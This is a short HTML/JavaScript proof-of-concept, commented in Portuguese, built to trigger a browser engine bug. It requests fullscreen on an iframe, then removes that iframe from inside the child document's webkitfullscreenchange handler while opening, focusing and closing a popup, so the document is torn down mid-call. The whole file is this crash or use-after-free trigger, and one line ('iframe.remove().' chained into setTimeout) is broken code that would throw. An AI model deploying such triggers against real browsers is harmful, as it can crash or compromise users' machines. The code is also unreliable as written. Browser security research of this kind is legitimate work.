<html>
<body>
<button id="run">Run V2</button>
<div id="status">Ready</div>
<iframe id="testFrame" width="100" height="100"></iframe>
<script>
/*
  DIFERENÇA DO ORIGINAL: iframe.remove() acontece de dentro do
  handler webkitfullscreenchange do documento filho — FullscreenManager
  está no meio da call stack quando o Document começa teardown.
*/

var iframe = document.getElementById("testFrame");
var popup = null;

iframe.onload = function() {
    var iDoc = iframe.contentDocument;
    iDoc.open();
    iDoc.write(
        '<!DOCTYPE html><html><body>' +
        '<div style="width:200px;height:150px;background:blue"></div>' +
        '</body></html>'
    );
    iDoc.close();

    // Listener no documento FILHO
    iDoc.addEventListener('webkitfullscreenchange', function() {
        document.getElementById("status").innerHTML =
            "CHILD fullscreenchange — removing iframe from callback";

        if (iframe && iframe.parentNode) {
            iframe.remove();
        }
        if (popup && !popup.closed) {
            popup.close();
        }
    });
};

document.getElementById("run").onclick = function() {
    popup = window.open("", "_blank", "width=400,height=300");
    popup.document.open();
    popup.document.write(
        '<!DOCTYPE html><html><body><h3>Popup</h3></body></html>'
    );
    popup.document.close();

    iframe.contentDocument.documentElement.webkitRequestFullscreen();

    setTimeout(function() {
        if (!popup || popup.closed) return;

        popup.focus();
        window.focus();
        iframe.contentWindow.focus();
        iframe.remove().
        setTimeout(function() {
            // popup.close() dispara eventos de foco
            // que podem coincidir com fullscreenchange do filho
            if (popup && !popup.closed) popup.close();
        }, 300);
    }, 300);
};
</script>
</body>
</html>
